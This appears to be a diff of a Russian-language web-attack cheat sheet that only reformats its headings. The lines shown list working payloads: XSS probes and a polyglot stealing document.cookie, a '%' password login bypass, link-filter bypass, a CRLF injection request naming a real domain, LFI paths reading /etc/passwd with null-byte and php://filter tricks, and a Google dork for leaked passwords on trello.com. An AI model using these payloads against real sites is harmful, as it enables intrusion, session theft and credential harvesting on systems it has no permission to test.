@@ -13,10 +13,11 @@ c - (Авторизация)
 d - (Оператор LIKE)
 Вместо пароля просто ввести "%"
 
-2. XSS
+**XSS**
+
 '":;<>/\[]<script><h1>
   
-'`'`;!--"<XSS>=&{()}`
+'';!--"<XSS>=&{()}`
 
 < - &lt;
 > - &gt;
@@ -77,21 +78,21 @@ XSS с помощью css:
 Polyglot XSS - Mathias Karlsson
 " onclick=alert(document.cookie)//<button ‘ onclick=alert(document.cookie)//> */ alert(1)//
 
-3. Authentication bypass
+**Authentication bypass**
 В процессе аутентификации при доступе к веб-сайту, посетив ссылку для отмены подписки.
 PHPSESSID=xxx;
 
-4. Link filter protection bypass
+**Link filter protection bypass**
 ?url=site%E3%80%82com
 
-5. CRLF Injection
+**CRLF Injection**
 GET /qwerty%0ASet-Cookie:%20test=qwerty;domain=.beepcar.ru HTTP/1.1
 
-6. robots.txt
+**robots.txt**
 Disallow - Запрет доступа всех роботов 
 Allow - Разрешает доступ к определенной части ресурса
 
-7. LFI
+**LFI**
 /index.php?file=/../../../../../../etc/passwd 
 
 file=/../../../../../../etc/passwd.php%00 
@@ -104,5 +105,5 @@ index.txt/././././../...«(100-10)/2 раз».../././
 php://filter/convert.base64-encode/resource=index 
 http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
 
-8. google dork 
+**google dork**
 «site:trello.com AND intext:@gmail\.com AND intext:password»
